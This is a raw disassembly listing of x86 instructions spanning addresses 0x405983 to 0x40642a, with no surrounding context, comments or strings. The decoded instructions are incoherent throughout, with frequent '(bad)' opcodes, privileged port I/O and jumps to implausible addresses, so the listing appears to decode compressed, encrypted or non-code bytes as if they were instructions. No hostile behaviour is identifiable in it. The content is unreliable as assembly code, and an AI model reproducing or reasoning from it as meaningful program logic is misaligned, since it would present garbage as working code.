  405983:	adc    eax,DWORD PTR [edx+0x62]
  405986:	mov    ebx,0xab95c80b
  40598b:	mov    edx,0xfb03e919
  405990:	(bad)  
  405991:	test   eax,0xb62502ab
  405996:	pushf  
  405997:	jmp    0x405960
  405999:	ins    DWORD PTR es:[edi],dx
  40599a:	stos   DWORD PTR es:[edi],eax
  40599b:	cli    
  40599c:	and    al,0xa6
  40599e:	pushf  
  40599f:	fcmovnb st,st(7)
  4059a1:	popa   
  4059a2:	stos   DWORD PTR es:[edi],eax
  4059a3:	repnz and al,0x96
  4059a6:	pushf  
  4059a7:	lahf   
  4059a8:	mov    edi,0x5348033d
  4059ad:	xchg   BYTE PTR [esi],dl
  4059af:	mov    BYTE PTR [edx],dh
  4059b1:	cdq    
  4059b2:	mov    ecx,0x620041b3
	...
  4059df:	add    ah,bl
  4059e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059e2:	pop    edi
  4059e3:	mov    al,ds:0xbc006add
  4059e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e9:	and    DWORD PTR cs:0x322badb7,0xffffff9c
  4059f1:	mov    edi,0x912be90c
  4059f6:	add    esp,0x6f
  4059f9:	inc    ecx
  4059fa:	jae    0x4059ad
  4059fc:	mov    ds:0x8899fc97,al
  405a01:	(bad)  
  405a02:	or     al,0x41
  405a04:	cld    
  405a05:	sbb    BYTE PTR [eax],al
  405a07:	jmp    0xd9b874ae
  405a0c:	mov    al,0xc7
  405a0e:	or     al,0x1
  405a10:	xor    BYTE PTR ds:0x97960eff,ch
  405a16:	clc    
  405a17:	push   es
  405a18:	adc    bh,BYTE PTR [edi]
  405a1a:	call   0x9ab4ac
  405a1f:	loop   0x405a80
  405a21:	(bad)  
  405a22:	sbb    esi,ebp
  405a24:	or     DWORD PTR [ebx-0x1],ebp
  405a27:	pop    esp
  405a28:	mov    eax,0x2054ffab
  405a2d:	xor    eax,DWORD PTR [ebx]
  405a2f:	xlat   BYTE PTR ds:[ebx]
  405a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a31:	inc    eax
  405a32:	mov    esi,DWORD PTR [ecx-0x2e033959]
  405a38:	sub    eax,0x96e90016
  405a3d:	(bad)  
  405a3e:	or     al,0xc1
  405a40:	sub    eax,0xaeff27
	...
  405a6d:	xchg   ebx,eax
  405a6e:	sbb    al,0x5b
  405a70:	mov    al,0xe2
  405a72:	dec    edi
  405a73:	add    BYTE PTR [ebx+eiz*4],dh
  405a76:	das    
  405a77:	sub    DWORD PTR [ebp-0x7100bed0],0x71d695
  405a81:	mov    ds:0xd50fee4,eax
  405a86:	push   esi
  405a87:	add    DWORD PTR [eax],eax
  405a89:	mov    ch,0xf4
  405a8b:	pop    ss
  405a8c:	(bad)  
  405a8d:	mov    ch,0x5c
  405a8f:	leave  
  405a90:	ret    
  405a91:	fcom   st(1)
  405a93:	jmp    0x405a18
  405a95:	jo     0x405aeb
  405a97:	add    BYTE PTR [edx+edx*4-0x27],dh
  405a9b:	jl     0x405aad
  405a9d:	jne    0x405aef
  405a9f:	sbb    edi,edi
  405aa1:	mov    eax,0x6d75fe30
  405aa6:	hlt    
  405aa7:	(bad)  
  405aa9:	xor    ah,ah
  405aab:	(bad)  
  405aac:	jne    0x405af3
  405aae:	in     eax,0x74
  405ab0:	or     al,0x2
  405ab2:	push   0x8
  405ab4:	call   0x3f67f3
  405ab9:	cld    
  405aba:	sbb    BYTE PTR [eax],dl
  405abc:	add    BYTE PTR [eax-0x5f7c142f],cl
  405ac2:	push   esp
  405ac3:	add    BYTE PTR [ecx+edx*2-0x27],dh
  405ac7:	jl     0x405ad5
  405ac9:	xor    eax,0xa8ff1650
  405ace:	dec    ebx
  405acf:	(bad)  
  405ad0:	jne    0x405ad2
	...
  405afa:	or     eax,0xf2d6b2f4
  405aff:	in     al,0xfe
  405b01:	jne    0x405b04
  405b03:	in     eax,0x74
  405b05:	or     ch,bl
  405b07:	dec    ebp
  405b08:	xlat   BYTE PTR ds:[ebx]
  405b09:	jmp    edx
  405b0b:	push   cs
  405b0c:	ret    0x50c
  405b0f:	mov    ecx,DWORD PTR [ebx-0xfff8914]
  405b15:	jmp    FWORD PTR [eax]
  405b17:	push   ebx
  405b18:	call   0xff253d62
  405b1d:	mov    eax,edi
  405b1f:	push   edx
  405b20:	cmp    DWORD PTR [ebp+0x1c],0x36
  405b24:	add    esi,DWORD PTR [edx+ebp*2-0x2f]
  405b28:	(bad)  
  405b2a:	les    eax,FWORD PTR [edx+0x4cb3ffb9]
  405b30:	ret    
  405b31:	je     0x405b91
  405b33:	mov    bh,0x40
  405b35:	lock dec esp
  405b37:	mov    cl,0x10
  405b39:	or     al,0x84
  405b3b:	sub    DWORD PTR [edx-0x3cb36c01],edi
  405b41:	je     0x405b91
  405b43:	mov    bl,0x18
  405b45:	cld    
  405b46:	sbb    al,0x32
  405b48:	repz (bad) 
  405b4a:	out    dx,al
  405b4b:	push   ecx
  405b4c:	fwait
  405b4d:	jne    0x405bbf
  405b4f:	adc    BYTE PTR [eax],0xf8
  405b52:	je     0x405ae0
  405b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b55:	jmp    DWORD PTR [ebx+0x3c]
  405b58:	ret    
  405b59:	jne    0x405b88
  405b5b:	jns    0x405b6d
  405b5d:	adc    BYTE PTR [eax],al
	...
  405b87:	push   ebx
  405b88:	out    0x96,al
  405b8a:	call   ecx
  405b8c:	imul   ebx,DWORD PTR [edx+0x4a5a1475],0x88583bff
  405b96:	inc    ebp
  405b97:	sub    al,0xe1
  405b99:	stos   BYTE PTR es:[edi],al
  405b9a:	(bad)  
  405b9b:	dec    ebx
  405b9c:	dec    eax
  405b9d:	cdq    
  405b9e:	jmp    FWORD PTR [ecx-0xa7954e3]
  405ba4:	xor    eax,0x30dec999
  405ba9:	add    edx,DWORD PTR [ebp-0x69]
  405bac:	sbb    BYTE PTR [ebp+0xf0e0cc4],al
  405bb2:	or     al,0x4
  405bb4:	loope  0x405b6f
  405bb6:	push   ebx
  405bb8:	retf   
  405bb9:	aas    
  405bba:	or     al,0x9f
  405bbc:	xchg   DWORD PTR [eax],ecx
  405bbe:	add    BYTE PTR [eax+0x75],ch
  405bc1:	cdq    
  405bc2:	jne    0x405bec
  405bc4:	pop    ebx
  405bc5:	xchg   ecx,eax
  405bc6:	inc    esp
  405bc7:	repnz ds sahf 
  405bca:	or     eax,0x86dac7dc
  405bcf:	pop    ecx
  405bd0:	dec    ebx
  405bd1:	cmp    DWORD PTR [ecx-0x6e6eb0cf],ebx
  405bd7:	sar    BYTE PTR [esi],cl
  405bd9:	jle    0x405be8
  405bdb:	fadd   st(7),st
  405bdd:	retf   0x2182
  405be0:	aas    
  405be1:	jmp    0xda9b87e9
  405be6:	repnz xchg edx,eax
  405be8:	enter  0x98f9,0x0
	...
  405c14:	adc    DWORD PTR [edi],edi
  405c16:	push   esi
  405c17:	je     0x844c305b
  405c1d:	xor    BYTE PTR [edi-0x67],al
  405c20:	jae    0x405bf2
  405c22:	mov    ds:0xcd32cc93,eax
  405c27:	mov    eax,0xf2e3e63
  405c2c:	sub    BYTE PTR [ebx],dh
  405c2e:	int    0xba
  405c30:	push   ebx
  405c31:	ds xor dh,al
  405c34:	sbb    BYTE PTR [ebx-0x44],bl
  405c37:	mov    WORD PTR [eax],?
  405c39:	fisub  DWORD PTR [esp+edx*4]
  405c3c:	iret   
  405c3d:	jno    0x405c61
  405c3f:	cdq    
  405c40:	test   eax,0x4a291152
  405c45:	test   BYTE PTR ds:[edx+0x176a52d9],0x24
  405c4d:	pop    ebx
  405c4e:	pop    ebp
  405c4f:	inc    edx
  405c50:	adc    ecx,eax
  405c52:	icebp  
  405c53:	stos   DWORD PTR es:[edi],eax
  405c54:	out    0x1f,eax
  405c56:	(bad)  
  405c57:	cwde   
  405c58:	pop    ss
  405c59:	sbb    edx,DWORD PTR [ebp-0x2a]
  405c5c:	test   al,0x97
  405c5e:	mov    ecx,0xf1c7f333
  405c63:	stos   DWORD PTR es:[edi],eax
  405c64:	mov    ds,WORD PTR [eax+eax*1]
  405c67:	mov    dh,0x84
  405c69:	push   ecx
  405c6a:	shl    BYTE PTR ds:0xa57cdac2,0x1f
  405c71:	pop    ebx
  405c72:	adc    cl,ch
  405c74:	xor    BYTE PTR [ebx-0x1],ch
  405c77:	sbb    al,0x0
	...
  405ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ca2:	cmp    eax,0x77879175
  405ca7:	loop   0x405c2f
  405ca9:	xchg   esp,eax
  405caa:	push   ecx
  405cab:	shl    ch,0x1e
  405cae:	call   0xe9e8:0xaa882c8d
  405cb5:	aam    0x3d
  405cb7:	jmp    DWORD PTR [esi+0x22]
  405cba:	push   ebx
  405cbb:	call   0xff7e23e9
  405cc0:	bound  ebx,QWORD PTR [eax-0x5f]
  405cc3:	leave  
  405cc4:	sub    edi,DWORD PTR [ebx+0x3d]
  405cc7:	push   esp
  405cc8:	jb     0x405c85
  405cca:	fcmovnb st,st(3)
  405ccc:	jne    0x405c53
  405cce:	cmp    eax,0x2e22eff
  405cd3:	(bad)  
  405cd4:	cs mov ah,0x5a
  405cd7:	add    cl,ch
  405cd9:	pop    ds
  405cda:	rol    BYTE PTR [ebp+ebp*8+0x18],cl
  405cde:	sbb    esi,DWORD PTR [esp+ebp*8-0x61]
  405ce2:	add    BYTE PTR [eax],0x94
  405ce5:	cmp    dh,BYTE PTR [edx]
  405ce7:	js     0x405cd1
  405ce9:	pop    ds
  405cea:	pop    ebx
  405ceb:	push   DWORD PTR [ebx+eiz*1+0x33]
  405cef:	fisttp QWORD PTR [edx]
  405cf1:	test   BYTE PTR ds:0x4c2a290b,bh
  405cf7:	push   0x9a4fe8
  405cfc:	fisubr WORD PTR ds:0xcbf2e84f
  405d02:	cmp    al,0xff
  405d04:	ret    0x0
	...
  405d2b:	add    BYTE PTR [eax],al
  405d2d:	add    BYTE PTR ds:0x150006b3,ah
  405d33:	xchg   esi,eax
  405d34:	add    bh,bh
  405d36:	xor    BYTE PTR [ebx-0x18],dl
  405d39:	or     al,0x89
  405d3b:	in     al,0xfe
  405d3d:	mov    DWORD PTR [eax-0x61],eax
  405d40:	(bad)  
  405d41:	(bad)  
  405d42:	jp     0x405db3
  405d44:	add    DWORD PTR ds:[ebp+0x77858d58],esi
  405d4b:	in     eax,0xfe
  405d4d:	push   ebp
  405d4f:	out    dx,al
  405d50:	sbb    eax,0xffffff9a
  405d53:	in     al,0x8c
  405d55:	test   DWORD PTR [edi-0x1b],esi
  405d58:	(bad)  
  405d59:	inc    DWORD PTR ds:0xbb8b4e4
  405d5f:	in     al,0xfe
  405d61:	call   0x407619
  405d66:	or     al,0xda
  405d68:	mov    ebx,0x3fe3eafe
  405d6d:	sgdtd  [ecx+0x0]
  405d71:	add    BYTE PTR [ebp+0x2bc294d3],al
  405d77:	in     al,0xfe
  405d79:	div    DWORD PTR [edi+0x48]
  405d7c:	(bad)  
  405d7d:	inc    DWORD PTR [ebp+0x55]
  405d80:	test   BYTE PTR [ebx-0x72ffa7bb],al
  405d86:	ja     0x405dbc
  405d88:	dec    edi
  405d89:	push   0x419429
  405d8e:	sbb    eax,0xc2d4
	...
  405dbb:	inc    ebp
  405dbc:	push   ecx
  405dbd:	shl    BYTE PTR [ebp+0x40],0xef
  405dc1:	retf   
  405dc2:	add    BYTE PTR ds:0x47958d58,dh
  405dc8:	in     eax,0xfe
  405dca:	dec    DWORD PTR [eax+0x6d502c9a]
  405dd0:	in     eax,0x4e
  405dd2:	inc    ecx
  405dd3:	sbb    al,0x32
  405dd5:	stos   DWORD PTR es:[edi],eax
  405dd6:	jb     0x405db7
  405dd8:	xor    DWORD PTR [ebx],eax
  405dda:	or     ebx,esp
  405ddc:	jle    0x405ddf
  405dde:	jmp    0x438f9e
  405de3:	jecxz  0x405e63
  405de5:	or     al,ch
  405de7:	adc    eax,0x27ff9611
  405dec:	repnz (bad) 
  405dee:	sysenter 
  405df0:	lahf   
  405df1:	dec    ebx
  405df2:	inc    ecx
  405df3:	sbb    al,0xe5
  405df5:	(bad)  
  405df7:	les    esp,FWORD PTR [ebx+edi*4-0x1]
  405dfb:	mov    bl,0xe8
  405dfd:	or     BYTE PTR [edx+0x1c],ch
  405e00:	mov    ebp,0x58b40c10
  405e05:	mov    ebx,0x709e9bff
  405e0a:	ret    0xb492
  405e0d:	xchg   esi,eax
  405e0e:	(bad)  
  405e0f:	out    dx,al
  405e10:	dec    ebp
  405e11:	xor    dl,BYTE PTR [eax+0x74]
  405e14:	aam    0xb9
  405e16:	(bad)  
  405e17:	jnp    0x405e1a
  405e19:	xchg   esi,eax
  405e1a:	jne    0x405e30
  405e1c:	xchg   ebp,eax
  405e1d:	adc    BYTE PTR [eax+eax*1],dl
	...
  405e48:	imul   eax,DWORD PTR [esi],0xfffffff3
  405e4b:	dec    edi
  405e4c:	arpl   si,di
  405e4e:	or     ch,al
  405e50:	dec    esp
  405e51:	imul   edx,DWORD PTR [esi-0x5172bb01],0xffffffff
  405e58:	dec    ebx
  405e59:	push   0x15de8d23
  405e5e:	mov    WORD PTR [ebp-0x69b490],es
  405e64:	lahf   
  405e65:	(bad)  
  405e66:	repnz push DWORD PTR [eax+0x2312aa2f]
  405e6d:	mov    esi,0x70d1fef3
  405e72:	xchg   ebp,eax
  405e73:	call   DWORD PTR [ebx]
  405e75:	pop    esp
  405e76:	ror    DWORD PTR [ebp+0x8e95bdf],1
  405e7c:	fsubr  QWORD PTR [edi-0x5c46d3ec]
  405e82:	sub    BYTE PTR [ebx+esi*8],al
  405e85:	mov    al,0xf5
  405e87:	stos   DWORD PTR es:[edi],eax
  405e88:	or     eax,0xe395be16
  405e8d:	lock jl 0x405e26
  405e90:	fstp   TBYTE PTR [edx]
  405e92:	sbb    DWORD PTR [ebp+esi*2+0x6c95a616],ebp
  405e99:	ficomp WORD PTR [ebx]
  405e9b:	cld    
  405e9c:	ret    
  405e9d:	scas   al,BYTE PTR es:[edi]
  405e9e:	in     eax,0x94
  405ea0:	xor    DWORD PTR [edi+0x39],ecx
  405ea3:	xchg   ebp,eax
  405ea4:	sub    DWORD PTR [ebx-0x7a],esp
  405ea7:	das    
  405ea8:	add    al,0x46
  405eaa:	in     eax,dx
  405eab:	xchg   esp,eax
	...
  405ed4:	add    BYTE PTR [ecx],ch
  405ed6:	dec    edi
  405ed7:	sbb    DWORD PTR [ebp+0x30816311],edx
  405edd:	xchg   ecx,eax
  405ede:	cmp    ah,BYTE PTR [esi-0x54]
  405ee1:	ficom  WORD PTR [ecx]
  405ee3:	pop    esi
  405ee4:	xchg   ebp,eax
  405ee5:	xchg   ecx,eax
  405ee6:	loopne 0x405f12
  405ee8:	xchg   esi,eax
  405ee9:	jnp    0x405f25
  405eeb:	mov    ecx,0x46f7a994
  405ef0:	xchg   ebp,eax
  405ef1:	imul   eax,DWORD PTR [ebx-0x71],0xffffffc2
  405ef5:	sbb    al,0x5b
  405ef7:	ins    BYTE PTR es:[edi],dx
  405ef8:	les    ebp,FWORD PTR [ebx]
  405efa:	loopne 0x405f33
  405efc:	xchg   esi,eax
  405efd:	push   ebx
  405efe:	cmp    ah,BYTE PTR [esi]
  405f00:	dec    edi
  405f01:	mov    BYTE PTR [ecx],bh
  405f03:	push   ds
  405f04:	xchg   ebp,eax
  405f05:	xor    al,0xfc
  405f07:	sub    al,BYTE PTR [esp+ebx*1]
  405f0a:	cmp    dl,BYTE PTR [esp+ebx*2+0x32]
  405f0e:	cmp    al,BYTE PTR [esi]
  405f10:	lods   al,BYTE PTR ds:[esi]
  405f11:	push   cs
  405f12:	adc    bh,dh
  405f14:	xchg   esp,eax
  405f15:	push   ebp
  405f16:	sbb    eax,0x901fdd00
  405f1b:	mov    edi,ebp
  405f1d:	inc    ebp
  405f1e:	pop    ebx
  405f1f:	call   FWORD PTR [esp+ecx*1+0x39]
  405f23:	jne    0x405f1e
  405f25:	test   al,0xaf
  405f27:	or     al,0xd6
  405f29:	sub    ah,BYTE PTR [ebx-0x18]
  405f2c:	push   cs
  405f2d:	mov    bh,BYTE PTR [ecx]
  405f2f:	push   DWORD PTR [eax+0x14004add]
  405f35:	xchg   ebp,eax
  405f36:	inc    esi
  405f37:	(bad)  
  405f38:	cmp    al,0x0
	...
  405f62:	and    al,0x43
  405f64:	inc    ecx
  405f65:	xchg   edx,eax
  405f66:	test   al,0x39
  405f68:	or     ebp,DWORD PTR [ecx+0x14ff591b]
  405f6e:	enter  0xe8a9,0xa6
  405f72:	jne    0x405fad
  405f74:	(bad)  
  405f75:	cmp    DWORD PTR [ecx+0x1a8618af],ecx
  405f7b:	dec    edi
  405f7c:	push   eax
  405f7d:	jle    0x405f91
  405f7f:	arpl   ax,bp
  405f81:	aaa    
  405f82:	mov    al,0x39
  405f84:	inc    DWORD PTR [ecx+0x66ff10d0]
  405f8a:	push   esi
  405f8b:	sbb    al,0x14
  405f8d:	jmp    0x572c45c4
  405f92:	sub    cl,BYTE PTR [edi-0x1]
  405f95:	aam    0x6f
  405f97:	cmp    BYTE PTR [ebp-0xb],dh
  405f9a:	xor    eax,0x17b4ff55
  405f9f:	inc    ebx
  405fa0:	mov    ecx,0xff39b036
  405fa5:	mov    ah,0x43
  405fa7:	cmp    BYTE PTR [ebp-0x7],dh
  405faa:	mov    al,0xaf
  405fac:	or     al,0x93
  405fae:	cmp    al,0x38
  405fb0:	jne    0x405f93
  405fb2:	xchg   DWORD PTR [eax],eax
  405fb4:	dec    DWORD PTR [esi]
  405fb6:	mov    BYTE PTR [ecx],bh
  405fb8:	jne    0x405fba
  405fba:	dec    ecx
  405fbb:	into   
  405fbc:	je     0x405fce
  405fbe:	and    ah,BYTE PTR [edi+0xc]
  405fc1:	push   0xfffffff1
  405fc3:	iret   
  405fc4:	je     0x405fce
	...
  405fee:	add    BYTE PTR ds:0x2ffffab,bl
  405ff4:	test   ecx,0x8b73f510
  405ffa:	in     al,dx
  405ffb:	xchg   BYTE PTR [ebx],ah
  405ffd:	lock push ebx
  405fff:	sub    esi,DWORD PTR [ebx+ebp*1-0x25]
  406003:	outs   dx,BYTE PTR ds:[esi]
  406004:	mov    ds:0xdde5ff0c,al
  406009:	inc    esp
  40600a:	clc    
  40600b:	xchg   edx,eax
  40600c:	push   edx
  40600d:	or     BYTE PTR [edi+0x45c6caf8],cl
  406013:	test   eax,0xb500005f
  406018:	loope  0x406056
  40601a:	mov    ebx,0x9dfe
  40601f:	or     DWORD PTR [ebx-0x7d],ebp
  406022:	jge    0x405fd1
  406024:	pop    esp
  406025:	je     0x40607d
  406027:	xor    BYTE PTR [edx+0x5e1f50f0],ah
  40602d:	push   0x0
  40602f:	pop    ds
  406030:	pop    edi
  406031:	cmp    DWORD PTR [ebp-0x7b],0x5c
  406035:	je     0x40603c
  406037:	loop   0x40608a
  406039:	adc    bl,ch
  40603b:	xchg   DWORD PTR [esi+0x0],edx
  40603e:	push   0xffffff85
  406040:	fild   DWORD PTR [eax+edi*8-0x7b]
  406044:	int    0x14
  406046:	mov    ebx,0xb009fae
  40604b:	add    eax,0x80832f53
  406050:	sar    bh,1
  406052:	jae    0x406054
	...
  40607c:	ins    BYTE PTR es:[edi],dx
  40607d:	mov    ecx,0x99ce0c45
  406082:	lock cmp ebx,DWORD PTR [edx+edi*1]
  406086:	sbb    dl,BYTE PTR [edi]
  406088:	fbld   TBYTE PTR [ebp+0x7f]
  40608b:	jne    0x4060bd
  40608d:	lods   eax,DWORD PTR ds:[esi]
  40608e:	adc    DWORD PTR [eax],ecx
  406090:	xchg   edi,eax
  406091:	pop    es
  406092:	xchg   ebx,eax
  406093:	jecxz  0x4060b3
  406095:	xor    eax,0x16598b67
  40609a:	xchg   edx,eax
  40609b:	jne    0x4060a9
  40609d:	mov    cl,0x3
  40609f:	dec    DWORD PTR [ecx-0x231964f2]
  4060a5:	inc    ecx
  4060a6:	add    ecx,DWORD PTR [ebx+0x5b3288df]
  4060ac:	aad    0x3
  4060ae:	(bad)  
  4060af:	dec    DWORD PTR [eax-0x53]
  4060b2:	lahf   
  4060b3:	and    eax,0xffffffed
  4060b6:	xor    eax,0x3a9a6b56
  4060bb:	push   eax
  4060bc:	pop    ebp
  4060bd:	inc    edx
  4060be:	fwait
  4060bf:	ins    BYTE PTR es:[edi],dx
  4060c0:	fld    QWORD PTR [ecx+0x3]
  4060c3:	mov    edx,esp
  4060c5:	or     BYTE PTR [eax-0x4],cl
  4060c8:	sbb    al,0x42
  4060ca:	add    eax,DWORD PTR [eax]
  4060cc:	pop    ss
  4060cd:	add    dl,BYTE PTR [edi]
  4060cf:	ds xor al,0x84
  4060d2:	xor    al,0x41
  4060d4:	sbb    al,0x55
  4060d6:	pushf  
  4060d7:	hlt    
  4060d8:	pop    esp
  4060d9:	inc    ecx
  4060da:	add    ecx,DWORD PTR [ebx]
  4060dc:	pop    esp
  4060dd:	adc    eax,0x8ae2
	...
  406106:	add    BYTE PTR [eax],al
  406108:	add    BYTE PTR [ecx+ecx*1+0x41dd5026],cl
  40610f:	ss call 0x43e294
  406115:	pop    ss
  406116:	adc    BYTE PTR [edi],0x1e
  406119:	xchg   edi,eax
  40611a:	cdq    
  40611b:	add    BYTE PTR [ebp+0x58],0xd1
  40611f:	call   0x4b50:0x3415cec
  406126:	pop    edx
  406127:	ds xchg cl,al
  40612a:	ss jmp 0xe8338747
  406130:	add    ebx,DWORD PTR [ebx+ebx*2]
  406133:	scas   al,BYTE PTR es:[edi]
  406134:	xor    edi,eax
  406136:	and    DWORD PTR [edx],ebp
  406138:	dec    ebx
  406139:	sbb    al,0x5b
  40613b:	jmp    0x92d5dc43
  406140:	mov    esp,0x9f6290df
  406145:	lahf   
  406146:	pop    ds
  406147:	fld    DWORD PTR [ebp+0x4332ae41]
  40614d:	sbb    al,0x5b
  40614f:	pop    ebp
  406150:	neg    BYTE PTR [esi+0x5d3d5278]
  406156:	pop    ebx
  406157:	jmp    0xfc1a7673
  40615c:	adc    BYTE PTR [edi-0x64],ah
  40615f:	jmp    0x719eaa67
  406164:	add    ebx,DWORD PTR [ebx+ebx*2]
  406167:	jmp    0x24294126
  40616c:	mov    es,WORD PTR [eax]
	...
  406196:	loop   0x4061f3
  406198:	jmp    0xe99cbe66
  40619d:	leave  
  40619e:	pop    esp
  40619f:	pop    ecx
  4061a0:	jmp    0xe99abe6e
  4061a5:	leave  
  4061a6:	fcomp  QWORD PTR [esi-0x17]
  4061a9:	leave  
  4061aa:	fcomp  QWORD PTR [edi-0x1c]
  4061ad:	jle    0x406190
  4061af:	cs mov ecx,0xe9c11c1d
  4061b5:	sbb    eax,0x1de9c11c
  4061ba:	sbb    al,0xc1
  4061bc:	jmp    0xe9999ddc
  4061c1:	add    esi,esi
  4061c3:	jp     0x406198
  4061c5:	add    eax,0x3300a0a9
  4061ca:	or     BYTE PTR [esi],dh
  4061cc:	adc    eax,0x9c08b6
  4061d1:	repnz pop edi
  4061d3:	mov    al,0x2
  4061d5:	xor    BYTE PTR [ecx+0x1e],ah
  4061d8:	inc    ebp
  4061d9:	sbb    DWORD PTR [eax],ebx
  4061db:	pop    ebx
  4061dc:	add    cl,ch
  4061de:	stos   BYTE PTR es:[edi],al
  4061df:	lahf   
  4061e0:	lock cdq 
  4061e2:	mov    WORD PTR [eax+0x361f93f4],?
  4061e8:	adc    eax,0x9c5072
  4061ed:	loop   0x4061ce
  4061ef:	scas   eax,DWORD PTR es:[edi]
  4061f0:	pop    es
  4061f1:	scas   al,BYTE PTR es:[edi]
  4061f2:	pop    edx
  4061f3:	sub    eax,DWORD PTR [eax]
  4061f5:	jmp    0x5d3fbd19
	...
  406222:	add    BYTE PTR [ebp+esi*1-0x63d6b1eb],dl
  406229:	add    BYTE PTR [edx+0x5a],dh
  40622c:	sub    ecx,ecx
  40622e:	stos   BYTE PTR es:[edi],al
  40622f:	adc    ah,dl
  406231:	jmp    0x40629d
  406233:	fnclex 
  406235:	mov    WORD PTR [eax+ecx*2],fs
  406238:	mov    ebp,DWORD PTR [eax-0xd]
  40623b:	setl   BYTE PTR [eax]
  40623e:	xchg   ecx,eax
  40623f:	sub    bh,BYTE PTR [ecx]
  406241:	call   DWORD PTR [esi+0x15c061ef]
  406247:	push   ss
  406248:	fidivr DWORD PTR [ecx+esi*2-0x55]
  40624c:	lods   al,BYTE PTR ds:[esi]
  40624d:	imul   ebp,DWORD PTR [edx+eiz*8+0x2a],0x50
  406252:	adc    edx,0xa2e9001a
  406258:	sbb    bh,BYTE PTR [eax-0x39]
  40625b:	sbb    al,0xed
  40625d:	inc    esp
  40625e:	pop    esi
  40625f:	das    
  406260:	data16 mov dh,0xac
  406263:	lea    ecx,[edx+0x37e2970f]
  406269:	push   eax
  40626a:	add    BYTE PTR [edx-0x6d],ch
  40626d:	inc    ebp
  40626e:	cld    
  40626f:	mov    ch,0x5a
  406271:	mov    dh,0x45
  406273:	push   cs
  406274:	push   0xf
  406276:	mov    dh,0x80
  406278:	out    0x4f,eax
  40627a:	pavgw  mm3,QWORD PTR [ecx+edi*8+0x45934a50]
  406282:	clc    
  406283:	jne    0x4062df
  406285:	mov    bh,0x45
	...
  4062af:	add    BYTE PTR [ebx],dl
  4062b1:	push   0xf
  4062b3:	mov    bh,0x70
  4062b5:	int    0x4f
  4062b7:	call   DWORD PTR [eax-0x4af09838]
  4062bd:	cdq    
  4062be:	add    BYTE PTR [ebp-0x17af4b40],cl
  4062c4:	fwait
  4062c5:	pop    ds
  4062c6:	add    BYTE PTR [eax],al
  4062c8:	xchg   BYTE PTR [ebx],ah
  4062ca:	xor    al,0x8d
  4062cc:	inc    eax
  4062cd:	fisttp DWORD PTR [edi-0x18]
  4062d0:	or     esp,DWORD PTR [eax+eax*1+0x44da0500]
  4062d7:	mov    WORD PTR ds:0x4500a57,?
  4062dd:	pop    edi
  4062de:	call   0xff2538d0
  4062e3:	call   0x3f55f9
  4062e8:	ins    BYTE PTR es:[edi],dx
  4062e9:	sbb    BYTE PTR [ebp-0x75],dl
  4062ec:	cdq    
  4062ed:	faddp  st(3),st
  4062ef:	sub    al,0x9a
  4062f1:	in     al,0xfe
  4062f3:	push   ebx
  4062f4:	add    dl,BYTE PTR [ecx+0x0]
  4062f7:	push   0xffffff85
  4062f9:	in     eax,0x74
  4062fb:	or     BYTE PTR [ebp-0x5002f28],bl
  406301:	mov    ch,0x45
  406303:	cld    
  406304:	ins    DWORD PTR es:[edi],dx
  406305:	pop    edi
  406306:	add    bh,ch
  406308:	fwait
  406309:	in     al,0x74
  40630b:	or     BYTE PTR [edx+ebx*4],bl
  40630e:	mov    al,ds:0x1ca56bd0
  406313:	pushf  
	...
  40633c:	add    BYTE PTR [edx+eax*2],bl
  40633f:	add    ecx,DWORD PTR [ebp-0x71dd5f]
  406345:	push   ebx
  406346:	rcr    BYTE PTR [edx-0x707a8fa8],cl
  40634c:	(bad)  
  40634d:	cdq    
  40634e:	loop   0x4062dd
  406350:	(bad)  
  406351:	cmp    esi,DWORD PTR [esi-0x40e3fffc]
  406357:	mov    DWORD PTR [eax+0x2b],esp
  40635a:	gs (bad) 
  40635c:	push   eax
  40635d:	xor    al,0xa6
  40635f:	dec    edi
  406360:	add    BYTE PTR [ecx+ecx*1],bl
  406363:	mov    esp,0x51beee2b
  406368:	je     0x406375
  40636a:	inc    ebp
  40636b:	mov    gs,ebx
  40636d:	das    
  40636e:	ret    0xffce
  406371:	jo     0x4063b2
  406373:	dec    ecx
  406374:	add    DWORD PTR [edx+eax*2],ebx
  406377:	add    ecx,DWORD PTR [ebx]
  406379:	into   
  40637a:	lea    eax,[ebx]
  40637c:	(bad)  
  40637d:	sbb    eax,DWORD PTR [edx+0x46]
  406380:	inc    ecx
  406381:	popf   
  406382:	sbb    al,BYTE PTR [ebx+0x11421c00]
  406388:	in     eax,0x17
  40638a:	add    dl,BYTE PTR [edi]
  40638c:	push   ss
  40638d:	xor    al,0xde
  40638f:	add    al,BYTE PTR [eax]
  406391:	sbb    al,0xc7
  406393:	mov    BYTE PTR [eax-0x4d],ah
  406396:	int3   
  406397:	lea    edx,[eax-0x55]
  40639a:	dec    esi
  40639b:	cld    
  40639c:	out    0x60,eax
  40639e:	ror    DWORD PTR [ebp+0xff],1
	...
  4063c8:	add    BYTE PTR [eax],al
  4063ca:	xchg   DWORD PTR [ebp+0x19],eax
  4063cd:	add    BYTE PTR [esi],al
  4063cf:	inc    edx
  4063d0:	mov    ?,WORD PTR [ebp+0x14]
  4063d3:	ficomp DWORD PTR [eax+edx*8-0x7d]
  4063d7:	pop    edx
  4063d8:	data16 fwait
  4063da:	imul   esi,DWORD PTR ds:0x33cc8e5e,0xc083fbdc
  4063e4:	cmp    DWORD PTR [esi+0x7e9c263],ecx
  4063ea:	sbb    al,0x5b
  4063ec:	push   ecx
  4063ed:	lds    ebp,FWORD PTR [edi+0x33]
  4063f0:	ss jl  0x406394
  4063f3:	xchg   esi,eax
  4063f4:	mov    es,WORD PTR cs:[ebx-0x3e]
  4063f8:	add    bl,BYTE PTR es:[ebx+ebx*2]
  4063fc:	push   ds
  4063fd:	pop    eax
  4063fe:	shl    BYTE PTR [ebx],1
  406400:	push   ss
  406401:	mov    ?,WORD PTR [eax+ebx*2-0x3ce3fc07]
  406408:	jmp    0x119b8014
  40640d:	call   0x3429bfe4
  406412:	or     ebp,ecx
  406414:	mov    WORD PTR [esi+0x17e63303],cs
  40641a:	and    al,0x43
  40641c:	inc    esi
  40641d:	mov    ah,0xf3
  40641f:	xor    al,BYTE PTR [ecx-0x73]
  406422:	pop    ds
  406423:	pop    ebx
  406424:	jmp    0xc6d00db5
  406429:	(bad)  
  40642a:	fcmovnb st,st(3)
